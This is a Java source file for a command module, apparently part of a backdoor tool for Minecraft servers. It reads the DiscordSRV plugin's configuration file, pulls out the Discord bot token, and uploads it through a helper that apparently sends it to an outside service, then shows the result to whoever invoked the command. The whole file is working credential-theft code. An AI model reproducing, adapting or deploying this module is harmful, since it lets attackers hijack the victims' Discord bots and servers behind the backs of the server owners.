package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Utilities;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.entity.Player;
import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.util.ArrayList;
import java.util.Map;

public class DiscordSRV implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"discordsrv"};
    }

    @Override
    public String getDescription() {
        return "Upload discord srv token if the plugin is installed.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        File file = new File("./plugins/DiscordSRV/config.yml");

        if (!file.exists()) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "The config file doesn't exist!");
            return;
        }

        ArrayList<String> fileLines = new ArrayList<>();

        try (BufferedReader br = new BufferedReader(new FileReader(file))) {
            String line;
            while ((line = br.readLine()) != null) {
                fileLines.add(line);
            }
        } catch (IOException e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        Yaml yaml = new Yaml();
        Map<String, Object> config;
        try {
            config = yaml.load(String.join("\n", fileLines));
        } catch (Exception e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        try {
            String token = (String) config.get("BotToken");
            if (token == null) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "The bot token is not in config file!");
                return;
            }

            Reader reader = Utilities.uploadFile(token, context.getZ_(), "text");
            String sb = Utilities.getStringFromBuffer(reader);

            if (sb.length() == 0) {
                return;
            }

            sender.sendMessage(Colors.Prefix + Colors.Caution + sb);
        } catch (Exception e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
        }
    }
}
